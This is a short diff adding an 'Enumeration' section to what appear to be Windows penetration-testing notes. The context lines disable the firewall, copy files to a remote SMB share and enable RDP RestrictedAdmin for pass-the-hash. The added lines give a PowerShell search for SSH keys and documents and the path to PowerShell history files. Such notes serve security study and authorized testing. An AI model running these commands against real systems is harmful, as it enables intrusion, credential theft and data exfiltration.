@@ -74,6 +74,14 @@ Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 
 - Copy files: `copy <FILENAME> \\192.168.45.223\share`
 
+### Enumeration
+
+Search for interesting files:
+- `Get-ChildItem -Path C:\Users -Include *.xml,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,id_rsa,authorized_keys,*.exe,*.log -File -Recurse -ErrorAction SilentlyContinue`
+
+Powershell History Path:
+- `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
+
 ### Enable RDP and RestrictedAdmin from both Local/Remote: 
 *Note: Enabling RestrictedAdmin allow us to perform PassTheHash with RDP.*
 
